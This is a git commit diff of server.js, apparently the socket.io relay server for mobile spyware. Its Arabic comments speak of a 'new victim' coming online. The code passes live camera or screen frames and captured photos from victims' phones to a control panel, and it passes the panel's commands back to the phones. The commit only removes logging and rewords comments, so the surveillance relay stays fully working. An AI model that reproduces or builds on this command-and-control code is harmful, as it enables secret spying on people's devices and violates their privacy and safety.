2020044402336490c50d8821ec342fcb1e94fc6d
hamza734226204-eng <hamza734226204@gmail.com>
2026-05-03 17:12:45 +0300

    Update server.js

--- server.js
+++ server.js
@@ -9,31 +9,26 @@ const io = require('socket.io')(http, {
 app.get('/', (req, res) => { res.sendFile(__dirname + '/index.html'); });
 
 io.on('connection', (socket) => {
-    console.log('[-] نفق اتصال جديد: ' + socket.id);
-
-    // استقبال التبليغ من الهاتف وإرساله للوحة
+    // تبليغ عند دخول ضحية جديدة
     socket.on('victim_online', (data) => {
-        console.log('[!] تبليغ من ضحية: ' + data.model);
-        // نستخدم io.emit لإرسالها لجميع المتصفحات المفتوحة
         io.emit('new_victim_alert', { id: socket.id, model: data.model });
     });
 
-    // تمرير البث الحي
+    // استقبال فريمات البث (كاميرا أو شاشة)
     socket.on('video_frame', (frame) => {
         socket.broadcast.emit('display_frame', { frame: frame });
     });
 
-    // تمرير الصور الملتقطة
+    // استقبال الصور الملتقطة
     socket.on('photo_captured', (img) => {
         socket.broadcast.emit('display_photo', { img: img });
     });
 
-    // استقبال الأوامر من اللوحة وتوجيهها للهاتف
+    // تمرير الأوامر من اللوحة للهاتف
     socket.on('admin_command', (data) => {
-        console.log('[>] أمر مرسل: ' + data.command);
         io.emit(data.command, data); 
     });
 });
 
 const PORT = process.env.PORT || 8080;
-http.listen(PORT, '0.0.0.0', () => console.log('🚀 Server running on port ' + PORT));
+http.listen(PORT, '0.0.0.0', () => console.log('Server is Online on Port ' + PORT));
